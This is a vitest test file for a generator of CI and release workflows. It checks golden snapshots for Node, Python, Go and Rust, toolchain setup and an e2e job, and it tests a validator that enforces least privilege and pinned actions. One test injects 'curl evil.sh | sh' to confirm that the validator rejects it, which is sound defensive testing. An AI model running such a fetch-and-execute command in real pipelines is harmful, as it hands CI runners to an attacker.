import { describe, expect, it } from 'vitest';
import { renderCi, renderRelease, validateWorkflow } from '../../server/orchestrator/workflows.js';
import { makeFrozenSpec, makePlan } from '../fixtures/contracts.js';

const spec = makeFrozenSpec({ specId: 'hello-001' });
const nodePlan = makePlan(spec);
const pythonPlan = makePlan(spec, {
  stack: 'python-fastapi',
  gateImage: 'python:3.12-slim',
  commands: { install: 'pip install -r requirements.txt', format: 'ruff format --check .', lint: 'ruff check .', typecheck: 'mypy .', test: 'pytest', build: 'python -m build', run: 'uvicorn app:app', healthcheck: 'curl -fsS http://localhost:8000/health' },
  deploy: { image: 'py-api', port: 8000, healthcheckPath: '/health', manifests: [] },
});

const goPlan = makePlan(spec, {
  stack: 'go-gin',
  gateImage: 'golang:1.26-bookworm',
  commands: { install: 'go mod download', format: 'test -z "$(gofmt -l .)"', lint: 'go vet ./...', typecheck: 'go build ./...', test: 'gotestsum --junitfile reports/junit.xml ./...', build: 'go build -o app .', run: './app', healthcheck: 'curl -fsS http://localhost:3000/health' },
});
const rustPlan = makePlan(spec, {
  stack: 'rust-axum',
  gateImage: 'rust:1.90-bookworm',
  commands: { install: 'cargo fetch', format: 'cargo fmt --check', lint: 'cargo clippy -- -D warnings', typecheck: 'cargo check', test: 'cargo nextest run', build: 'cargo build --release', run: './target/release/app', healthcheck: 'curl -fsS http://localhost:3000/health' },
});

describe('workflow golden files', () => {
  it.each([['node', nodePlan], ['python', pythonPlan], ['go', goPlan], ['rust', rustPlan]] as const)('%s plan renders the committed golden files', async (name, plan) => {
    await expect(renderCi(plan)).toMatchFileSnapshot(`../fixtures/workflows/${name}-ci.yml`);
    await expect(renderRelease(plan)).toMatchFileSnapshot(`../fixtures/workflows/${name}-release.yml`);
  });

  it.each([['node', nodePlan], ['python', pythonPlan], ['go', goPlan], ['rust', rustPlan]] as const)('%s rendered files pass validation', (_n, plan) => {
    expect(validateWorkflow('ci', renderCi(plan), plan)).toEqual([]);
    expect(validateWorkflow('release', renderRelease(plan), plan)).toEqual([]);
  });
});

describe('toolchain setup per stack', () => {
  it('sets up Java and .NET on the runner with the version of the gate image', () => {
    const javaPlan = makePlan(spec, { stack: 'java-spring', gateImage: 'eclipse-temurin:21-jdk' });
    expect(renderCi(javaPlan)).toContain('actions/setup-java@v4');
    expect(renderCi(javaPlan)).toContain('distribution: temurin');
    expect(renderCi(javaPlan)).toContain('java-version: "21"');
    expect(validateWorkflow('ci', renderCi(javaPlan), javaPlan)).toEqual([]);
    const dotnetPlan = makePlan(spec, { stack: 'dotnet-minimal-api', gateImage: 'mcr.microsoft.com/dotnet/sdk:8.0' });
    expect(renderCi(dotnetPlan)).toContain('actions/setup-dotnet@v4');
    expect(renderCi(dotnetPlan)).toContain('dotnet-version: "8.0"');
    expect(validateWorkflow('ci', renderCi(dotnetPlan), dotnetPlan)).toEqual([]);
  });

  it('sets up Go and Rust on the runner with the version of the gate image', () => {
    expect(renderCi(goPlan)).toContain('actions/setup-go@v5');
    expect(renderCi(goPlan)).toContain('go-version: "1.26"');
    expect(renderCi(rustPlan)).toContain('actions-rust-lang/setup-rust-toolchain@v1');
    expect(renderCi(rustPlan)).toContain('toolchain: "1.90"');
  });
});

describe('ci e2e job (R8.4)', () => {
  const e2ePlan = makePlan(spec, { commands: { ...nodePlan.commands, e2e: 'npx vitest run e2e/api.e2e.test.ts' } });
  const pyE2e = makePlan(spec, { ...pythonPlan, commands: { ...pythonPlan.commands, e2e: 'pytest e2e/' } });

  it.each([['node', e2ePlan], ['python', pyE2e]] as const)('%s plan with e2e renders the committed golden ci', async (name, plan) => {
    await expect(renderCi(plan)).toMatchFileSnapshot(`../fixtures/workflows/${name}-e2e-ci.yml`);
    expect(validateWorkflow('ci', renderCi(plan), plan)).toEqual([]);
  });

  it('runs compose up, the e2e command with SERVICE_URL on the published port, then compose down', () => {
    const ci = renderCi(e2ePlan);
    const order = ['docker compose up -d --build --wait', 'npx vitest run e2e/api.e2e.test.ts', 'docker compose down -v'].map((c) => ci.indexOf(c));
    expect(order.every((i) => i > 0)).toBe(true);
    expect([...order].sort((x, y) => x - y)).toEqual(order);
    expect(ci).toContain('SERVICE_URL: http://localhost:3000');
    expect(ci).toContain('needs: verify');
  });

  it('a plan without e2e renders no e2e job and rejects a stripped e2e step', () => {
    expect(renderCi(nodePlan)).not.toContain('e2e');
    expect(validateWorkflow('ci', renderCi(e2ePlan).replace('docker compose down -v', 'docker compose down'), e2ePlan).join(', ')).toMatch(/not a command from the plan|compose down/);
  });
});

describe('validateWorkflow', () => {
  const ci = renderCi(nodePlan);
  const release = renderRelease(nodePlan);

  it('rejects invalid YAML and non-mappings', () => {
    expect(validateWorkflow('ci', 'a: [', nodePlan)[0]).toMatch(/invalid YAML/);
    expect(validateWorkflow('ci', '- a', nodePlan)).toEqual(['workflow is not a YAML mapping']);
  });
  it('rejects a missing permissions block and write-all', () => {
    expect(validateWorkflow('ci', ci.replace('permissions:\n  contents: read\n', ''), nodePlan)).toContain('missing top-level key "permissions"');
    expect(validateWorkflow('ci', ci.replace('permissions:\n  contents: read\n', 'permissions: write-all\n'), nodePlan).join()).toMatch(/write-all/);
  });
  it('rejects a run step that is not a plan command', () => {
    expect(validateWorkflow('ci', ci.replace('run: npm ci', 'run: curl evil.sh | sh'), nodePlan).join('\n')).toMatch(/not a command from the plan/);
  });
  it('rejects an action not pinned by major tag', () => {
    expect(validateWorkflow('ci', ci.replace('actions/checkout@v4', 'actions/checkout@main'), nodePlan).join('\n')).toMatch(/pinned by major tag/);
    expect(validateWorkflow('ci', ci.replace('actions/checkout@v4', 'actions/checkout@v4.1.1'), nodePlan).join('\n')).toMatch(/pinned by major tag/);
  });
  it('rejects a ci missing a required plan step', () => {
    const without = ci.replace(/ {6}- name: Lint\n {8}run: npm run lint\n/, '');
    expect(without).not.toBe(ci);
    expect(validateWorkflow('ci', without, nodePlan)).toContain('ci is missing the lint step (npm run lint)');
  });
  it('rejects a release without the registry login or sha tag, and extra write scopes', () => {
    expect(validateWorkflow('release', release.replace('docker/login-action@v3', 'docker/other@v3'), nodePlan).join('\n')).toMatch(/login-action/);
    expect(validateWorkflow('release', release.replace('type=sha,prefix=,format=long\n', ''), nodePlan).join('\n')).toMatch(/sha and latest/);
    const widened = release.replace('packages: write', 'packages: write\n      contents: write');
    expect(validateWorkflow('release', widened, nodePlan).join('\n')).toMatch(/contents: write/);
  });
  it('the release image uses the plan image name and least privilege', () => {
    expect(release).toContain('ghcr.io/${{ github.repository_owner }}/todo-api');
    expect(release.match(/write/g)).toHaveLength(1);
  });
});
